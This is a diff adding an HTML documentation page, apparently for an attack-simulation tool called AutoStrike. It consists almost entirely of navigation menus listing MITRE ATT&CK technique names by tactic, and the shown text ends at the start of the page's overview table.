+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1548002-bypass-user-account-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1548.002 - Bypass User Account Control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1078003-local-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1078.003 - Local Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1134001-token-impersonationtheft" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1134.001 - Token Impersonation/Theft
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense-evasion-6-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense Evasion (6 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense Evasion (6 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1070004-file-deletion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1070.004 - File Deletion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1562001-disable-or-modify-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1562.001 - Disable or Modify Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1027-obfuscated-files-or-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1027 - Obfuscated Files or Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1070001-clear-windows-event-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1070.001 - Clear Windows Event Logs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1036005-match-legitimate-name-or-location" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1036.005 - Match Legitimate Name or Location
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1218011-rundll32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1218.011 - Rundll32
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-access-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Access (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Credential Access (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1552001-credentials-in-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1552.001 - Credentials In Files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1555003-credentials-from-web-browsers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1555.003 - Credentials from Web Browsers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1003008-etcpasswd-and-etcshadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1003.008 - /etc/passwd and /etc/shadow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1552004-private-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1552.004 - Private Keys
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#discovery-9-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery (9 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Discovery (9 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1082-system-information-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1082 - System Information Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1083-file-and-directory-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1083 - File and Directory Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1057-process-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1057 - Process Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1016-system-network-configuration-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1016 - System Network Configuration Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1049-system-network-connections-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1049 - System Network Connections Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1087-account-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1087 - Account Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1069-permission-groups-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1069 - Permission Groups Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1018-remote-system-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1018 - Remote System Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1007-system-service-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1007 - System Service Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Lateral Movement (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1021001-remote-desktop-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1021.001 - Remote Desktop Protocol
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1021002-smbwindows-admin-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1021.002 - SMB/Windows Admin Shares
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1021004-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1021.004 - SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#collection-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Collection (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Collection (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1005-data-from-local-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1005 - Data from Local System
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1039-data-from-network-shared-drive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1039 - Data from Network Shared Drive
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1074001-local-data-staging" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1074.001 - Local Data Staging
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1119-automated-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1119 - Automated Collection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-and-control-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command and Control (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Command and Control (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1071001-web-protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1071.001 - Web Protocols
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1105-ingress-tool-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1105 - Ingress Tool Transfer
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1572-protocol-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1572 - Protocol Tunneling
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exfiltration-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exfiltration (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exfiltration (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1048003-exfiltration-over-unencrypted-non-c2-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1041-exfiltration-over-c2-channel" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1041 - Exfiltration Over C2 Channel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1567002-exfiltration-to-cloud-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1567.002 - Exfiltration to Cloud Storage
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impact-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Impact (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Impact (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1490-inhibit-system-recovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1490 - Inhibit System Recovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1489-service-stop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1489 - Service Stop
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1486-data-encrypted-for-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1486 - Data Encrypted for Impact
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#adding-custom-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding Custom Techniques
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Adding Custom Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#yaml-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        YAML Structure
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#import-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Import Techniques
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technique-locations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technique Locations
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance-2-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance (2 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance (2 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1592004-gather-victim-host-information-client-configurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1592.004 - Gather Victim Host Information: Client Configurations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1595002-active-scanning-vulnerability-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1595.002 - Active Scanning: Vulnerability Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Access (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Access (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1078-valid-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1078 - Valid Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1133-external-remote-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1133 - External Remote Services
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1190-exploit-public-facing-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1190 - Exploit Public-Facing Application
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution-5-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execution (5 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Execution (5 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1059001-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.001 - PowerShell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1059003-windows-command-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.003 - Windows Command Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1059004-unix-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.004 - Unix Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1047-windows-management-instrumentation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1047 - Windows Management Instrumentation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1059006-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.006 - Python
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#persistence-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Persistence (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Persistence (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1053005-scheduled-task" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1053.005 - Scheduled Task
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1547001-registry-run-keys-startup-folder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1547.001 - Registry Run Keys / Startup Folder
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1053003-cron" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1053.003 - Cron
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1543002-systemd-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1543.002 - Systemd Service
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1548001-setuid-and-setgid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1548.001 - Setuid and Setgid
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1548002-bypass-user-account-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1548.002 - Bypass User Account Control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1078003-local-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1078.003 - Local Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1134001-token-impersonationtheft" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1134.001 - Token Impersonation/Theft
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense-evasion-6-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense Evasion (6 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense Evasion (6 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1070004-file-deletion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1070.004 - File Deletion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1562001-disable-or-modify-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1562.001 - Disable or Modify Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1027-obfuscated-files-or-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1027 - Obfuscated Files or Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1070001-clear-windows-event-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1070.001 - Clear Windows Event Logs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1036005-match-legitimate-name-or-location" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1036.005 - Match Legitimate Name or Location
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1218011-rundll32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1218.011 - Rundll32
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-access-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Access (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Credential Access (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1552001-credentials-in-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1552.001 - Credentials In Files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1555003-credentials-from-web-browsers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1555.003 - Credentials from Web Browsers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1003008-etcpasswd-and-etcshadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1003.008 - /etc/passwd and /etc/shadow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1552004-private-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1552.004 - Private Keys
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#discovery-9-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery (9 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Discovery (9 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1082-system-information-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1082 - System Information Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1083-file-and-directory-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1083 - File and Directory Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1057-process-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1057 - Process Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1016-system-network-configuration-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1016 - System Network Configuration Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1049-system-network-connections-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1049 - System Network Connections Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1087-account-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1087 - Account Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1069-permission-groups-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1069 - Permission Groups Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1018-remote-system-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1018 - Remote System Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1007-system-service-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1007 - System Service Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Lateral Movement (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1021001-remote-desktop-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1021.001 - Remote Desktop Protocol
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1021002-smbwindows-admin-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1021.002 - SMB/Windows Admin Shares
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1021004-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1021.004 - SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#collection-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Collection (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Collection (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1005-data-from-local-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1005 - Data from Local System
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1039-data-from-network-shared-drive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1039 - Data from Network Shared Drive
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1074001-local-data-staging" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1074.001 - Local Data Staging
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1119-automated-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1119 - Automated Collection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-and-control-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command and Control (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Command and Control (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1071001-web-protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1071.001 - Web Protocols
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1105-ingress-tool-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1105 - Ingress Tool Transfer
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1572-protocol-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1572 - Protocol Tunneling
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exfiltration-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exfiltration (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exfiltration (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1048003-exfiltration-over-unencrypted-non-c2-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1041-exfiltration-over-c2-channel" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1041 - Exfiltration Over C2 Channel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1567002-exfiltration-to-cloud-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1567.002 - Exfiltration to Cloud Storage
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impact-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Impact (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Impact (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1490-inhibit-system-recovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1490 - Inhibit System Recovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1489-service-stop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1489 - Service Stop
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1486-data-encrypted-for-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1486 - Data Encrypted for Impact
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#adding-custom-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding Custom Techniques
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Adding Custom Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#yaml-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        YAML Structure
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#import-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Import Techniques
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technique-locations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technique Locations
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="mitre-attck-techniques">MITRE ATT&amp;CK Techniques<a class="headerlink" href="#mitre-attck-techniques" title="Permanent link">&para;</a></h1>
+<p>AutoStrike implements 48 MITRE ATT&amp;CK techniques across 13 tactics.</p>
+<hr />
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Count</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reconnaissance</td>
+<td>2</td>
